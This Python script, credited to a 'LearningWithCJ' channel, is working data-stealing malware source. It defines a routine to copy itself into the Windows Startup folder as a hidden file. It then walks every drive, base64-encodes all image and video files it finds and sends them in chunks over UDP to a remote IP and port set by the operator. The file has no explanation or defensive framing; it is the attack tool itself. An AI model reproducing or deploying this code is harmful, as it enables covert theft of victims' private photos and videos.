#
#  _                                _                __          __ _  _    _        _____      _ 
# | |                              (_)               \ \        / /(_)| |  | |      / ____|    | |
# | |      ___   __ _  _ __  _ __   _  _ __    __ _   \ \  /\  / /  _ | |_ | |__   | |         | |
# | |     / _ \ / _` || '__|| '_ \ | || '_ \  / _` |   \ \/  \/ /  | || __|| '_ \  | |     _   | |
# | |____|  __/| (_| || |   | | | || || | | || (_| |    \  /\  /   | || |_ | | | | | |____| |__| |
# |______|\___| \__,_||_|   |_| |_||_||_| |_| \__, |     \/  \/    |_| \__||_| |_|  \_____|\____/ 
#                                              __/ |                                              
#                                             |___/                         -  By CJ
#
# YouTube : www.youtube.com/@LearningWithCJ
# GitHub  : www.github.com/LearningWithCJ
# Telegram: t.me/LearningWithCJ
#

import os
import sys
import platform
import subprocess
import socket
import base64
import win32api
import time
import shutil



IP = ''   #IP
PORT = 0  #PORT
SOC = None
formats = [# images
            ".png", ".apng",
            ".avif",
            ".gif", 
            ".jpg", ".jpeg", ".jfif", ".pjpeg", ".pgp",
            ".svg",
            ".webp",
            ".bmp",
            ".ico", ".cur",
            ".tif", ".tiff",
            # videos
            ".mp4", ".wmv", ".mov", ".mkv", ".avi"
            ]


def Direc():
    if (platform.system() == 'Windows'):
        direc = "\\"
    else:
        direc = "/"
    return platform.system(), direc
OS, direc = Direc()


def startup():
    if OS == 'Windows':
        user = os.path.expanduser("~").split("\\")[-1]
        name = sys.argv[0].split("/")[-1]
        src_path = sys.argv[0].replace("/", "\\")
        dst_path = fr"C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{name}"
        if os.path.exists(dst_path):
            return
        else:
            try:
                shutil.copy(src_path, dst_path)
                try:
                    subprocess.check_call(["attrib", "+h", dst_path])
                except:
                    return
            except:
                return


def decodeFile(path):
    try:
        data = []
        with open(path, "rb") as file:
            convert = base64.b64encode(file.read())
        start = 0
        end = 4000
        while True:
            data.append(convert[start:end])
            if end >= len(convert):
                break
            start += 4000
            end += 4000
        data.append(("\n" + os.path.basename(path)))
        data.append("END123")
        return data
    except:
        return False


def sendall(data):
    if data != False:
        while True:
            try:
                SOC.send("COKJ".encode("UTF-8"))
                msg, addr = SOC.recvfrom(1024)
                if msg.decode() == 'COKJ' and addr[0] == IP:
                    len_data = 0
                    for i in data:
                        len_data += len(i)
                    SOC.send(str(len_data).encode("UTF-8"))
                    time.sleep(0.5)
                    num = 0
                    done = False
                    while True:
                        try:
                            time.sleep(0.01)
                            try:
                                SOC.send(data[num])
                            except:
                                SOC.send(data[num].encode("UTF-8"))
                        except:
                            break
                        if data[num] == "END123":
                            done = True
                            break
                        else:    
                            num += 1
                    if done: break
            except:
                continue


def getFiles(path):
    try:
        return os.listdir(path)
    except:
        return []


def checkFiles(dir, files):
    for i in files:
        path = dir + direc + i
        if os.path.isdir(path):
            checkFiles(path, getFiles(path))
        elif os.path.isfile(path) and os.path.splitext(os.path.basename(path))[1] in formats:
            sendall(decodeFile(path))


def getDrives():
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split("\000")[:-1]
    return drives


def walk():
    drives = getDrives()
    for k, v in zip(drives, range(len(drives))):
        checkFiles(k, getFiles(k))


def client():
    global SOC
    SOC = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    SOC.connect((IP, PORT))
    SOC.settimeout(0.5)

    walk()



client()
